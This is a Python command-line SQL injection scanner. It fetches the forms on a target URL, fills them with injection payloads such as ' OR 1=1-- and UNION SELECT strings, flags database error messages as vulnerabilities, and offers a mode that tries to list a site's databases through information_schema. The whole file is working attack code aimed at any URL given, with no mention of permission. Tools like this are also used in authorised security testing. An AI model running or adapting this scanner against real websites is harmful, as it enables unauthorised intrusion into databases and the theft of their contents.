import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import logging
import shutil
import inspect
import threading
import argparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global headers for requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# SQL Injection payloads for basic testing
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=2 UNION SELECT NULL,NULL--"
]

# Function to extract forms from a page
def get_forms(url):
    try:
        response = requests.get(url, headers=HEADERS)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        logging.info(f"Found {len(forms)} forms on {url}")
        return forms
    except Exception as e:
        logging.error(f"Error fetching forms from {url}: {e}")
        return []

# Function to submit a form with payloads
def submit_form(form, url, payload):
    action = form.get('action')
    method = form.get('method', 'get').lower()
    inputs = form.find_all('input')
    data = {}
    for input_tag in inputs:
        name = input_tag.get('name')
        if name:
            data[name] = payload if input_tag.get('type') == 'text' else input_tag.get('value', '')

    target_url = urljoin(url, action)
    logging.info(f"Submitting form at {target_url} with method {method} and payload {payload}")
    try:
        if method == 'post':
            return requests.post(target_url, data=data, headers=HEADERS)
        return requests.get(target_url, params=data, headers=HEADERS)
    except Exception as e:
        logging.error(f"Error submitting form: {e}")
        return None

# Function to check if the response indicates a SQL Injection vulnerability
def is_vulnerable(response):
    errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
    ]
    for error in errors:
        if error in response.text.lower():
            return True
    return False

# Function to check for database enumeration using SQL Injection
def get_databases(url):
    payload = "' UNION SELECT NULL, GROUP_CONCAT(schema_name) FROM information_schema.schemata--"
    response = requests.get(url + payload, headers=HEADERS)
    if is_vulnerable(response):
        logging.info("SQL Injection succeeded. Checking databases...")
        return response.text
    else:
        logging.info("No database enumeration possible.")
        return None

# Worker thread for scanning a single URL
def scan_url(url):
    logging.info(f"Scanning URL: {url}")
    forms = get_forms(url)
    for form in forms:
        for payload in SQLI_PAYLOADS:
            response = submit_form(form, url, payload)
            if response and is_vulnerable(response):
                logging.info(f"[!] SQL Injection vulnerability found on {url}")
                return
    logging.info(f"[+] No vulnerabilities found on {url}")

# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument('-u', '--url', required=True, help="Target URL to scan")
    parser.add_argument('-dbs', action='store_true', help="Attempt to enumerate databases")
    args = parser.parse_args()

    url = args.url

    if args.dbs:
        databases = get_databases(url)
        if databases:
            logging.info("Databases found:")
            logging.info(databases)
        else:
            logging.info("No databases could be enumerated.")
    else:
        threads = []
        for _ in range(5):  # Example thread count
            thread = threading.Thread(target=scan_url, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        logging.info("Scanning complete.")
